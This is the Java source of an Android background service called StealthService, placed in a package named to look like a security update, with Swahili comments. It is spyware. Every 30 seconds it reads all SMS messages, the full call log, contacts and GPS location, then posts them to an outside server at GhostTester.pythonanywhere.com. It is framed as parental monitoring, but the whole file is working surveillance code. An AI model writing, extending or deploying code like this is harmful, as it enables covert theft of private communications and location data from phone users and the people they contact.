package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        Log.d(TAG, "🔍 StealthService imeanzishwa...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startSurveillance();
        return START_STICKY;
    }

    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start immediate data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 0);

        // Schedule periodic data collection every 30 seconds
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 30000, 30000); // 30 seconds = 30000 ms

        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya sekunde 30");
    }

    private void collectAndSendAllData() {
        try {
            JSONObject allData = new JSONObject();
            allData.put("parent_code", parentCode);
            allData.put("device_id", android.os.Build.MODEL);
            allData.put("timestamp", System.currentTimeMillis());
            allData.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));

            // Collect SMS data - ZOTE BILA LIMIT
            if (checkPermission(Manifest.permission.READ_SMS)) {
                allData.put("sms_data", collectSMSData());
            }

            // Collect calls data - ZOTE BILA LIMIT
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                allData.put("calls_data", collectCallsData());
            }

            // Collect contacts data - ZOTE BILA LIMIT
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                allData.put("contacts_data", collectContactsData());
            }

            // Collect location data
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                allData.put("location_data", collectLocationData());
            }

            // Collect device info
            allData.put("device_info", collectDeviceInfo());

            // Send to GhostTester server
            sendToServer(allData);

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }

    private JSONArray collectSMSData() {
        JSONArray smsArray = new JSONArray();
        try {
            // SMS ZOTE BILA LIMIT
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER  // ONDOA LIMIT KABISA
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        JSONObject sms = new JSONObject();
                        
                        // Jina la mtumaji/namba
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        sms.put("sender", address);
                        sms.put("phone_number", address);
                        
                        // Ujumbe wenyewe
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        sms.put("message", body);
                        sms.put("content", body);
                        
                        // Timestamp
                        String date = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        sms.put("timestamp", date);
                        sms.put("date", date);
                        
                        // Aina ya ujumbe (incoming/outgoing)
                        String type = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
                        String messageType = "incoming";
                        if ("2".equals(type)) {
                            messageType = "outgoing";
                        }
                        sms.put("type", messageType);
                        sms.put("message_type", messageType);
                        
                        // Additional info
                        sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.READ)));
                        sms.put("status", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.STATUS)));
                        
                        smsArray.put(sms);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing SMS: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ SMS zilizosomwa: " + smsArray.length());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS: " + e.getMessage());
        }
        return smsArray;
    }

    private JSONArray collectCallsData() {
        JSONArray callsArray = new JSONArray();
        try {
            // CALLS ZOTE BILA LIMIT
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC"  // ONDOA LIMIT KABISA
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        JSONObject call = new JSONObject();
                        
                        // Namba ya simu
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        call.put("number", number);
                        call.put("phone_number", number);
                        
                        // Muda wa simu
                        String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        call.put("duration", duration);
                        call.put("call_duration", duration);
                        
                        // Tarehe na muda
                        String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        call.put("date", date);
                        call.put("timestamp", date);
                        
                        // Aina ya simu (incoming/outgoing/missed)
                        String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        String callType = "incoming";
                        switch (type) {
                            case "1": callType = "incoming"; break;
                            case "2": callType = "outgoing"; break;
                            case "3": callType = "missed"; break;
                            default: callType = "unknown";
                        }
                        call.put("type", callType);
                        call.put("call_type", callType);
                        
                        // Jina la mtu (kama lipo)
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        if (name != null) {
                            call.put("name", name);
                            call.put("contact_name", name);
                        }
                        
                        callsArray.put(call);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing call: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Calls zilizosomwa: " + callsArray.length());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading calls: " + e.getMessage());
        }
        return callsArray;
    }

    private JSONArray collectContactsData() {
        JSONArray contactsArray = new JSONArray();
        try {
            // CONTACTS ZOTE BILA LIMIT
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // ONDOA LIMIT KABISA
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                        JSONObject contact = new JSONObject();
                        contact.put("name", name);
                        contact.put("contact_name", name);
                        contact.put("contact_id", contactId);

                        // Pata namba zote za simu za mtu huyu
                        Cursor phoneCursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                        );

                        JSONArray phones = new JSONArray();
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                                String phoneType = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                    ContactsContract.CommonDataKinds.Phone.TYPE));
                                
                                JSONObject phoneObj = new JSONObject();
                                phoneObj.put("number", phone);
                                phoneObj.put("phone_number", phone);
                                
                                // Aina ya namba (mobile, home, work)
                                String typeName = "mobile";
                                switch (phoneType) {
                                    case "1": typeName = "home"; break;
                                    case "2": typeName = "mobile"; break;
                                    case "3": typeName = "work"; break;
                                    default: typeName = "other";
                                }
                                phoneObj.put("type", typeName);
                                phoneObj.put("phone_type", typeName);
                                
                                phones.put(phoneObj);
                            }
                            phoneCursor.close();
                        }
                        contact.put("phones", phones);
                        contact.put("phone_numbers", phones);
                        
                        contactsArray.put(contact);
                        
                    } catch (Exception e) {
                        Log.e(TAG, "Error parsing contact: " + e.getMessage());
                    }
                }
                cursor.close();
                Log.d(TAG, "✅ Contacts zilizosomwa: " + contactsArray.length());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading contacts: " + e.getMessage());
        }
        return contactsArray;
    }

    private JSONObject collectLocationData() {
        JSONObject location = new JSONObject();
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    location.put("latitude", lastLocation.getLatitude());
                    location.put("longitude", lastLocation.getLongitude());
                    location.put("accuracy", lastLocation.getAccuracy());
                    location.put("timestamp", lastLocation.getTime());
                    location.put("location_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(lastLocation.getTime())));
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting location: " + e.getMessage());
        }
        return location;
    }

    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("product", android.os.Build.PRODUCT);
            deviceInfo.put("device", android.os.Build.DEVICE);
            deviceInfo.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage());
        }
        return deviceInfo;
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    private void sendToServer(JSONObject data) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/surveillance";

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ Data imetumwa kikamilifu kwa server - SMS: " + 
                          data.optJSONArray("sms_data").length() + 
                          ", Calls: " + data.optJSONArray("calls_data").length() +
                          ", Contacts: " + data.optJSONArray("contacts_data").length());
                } else {
                    Log.e(TAG, "❌ Server returned error: " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending data: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 StealthService imezimwa");
    }
}
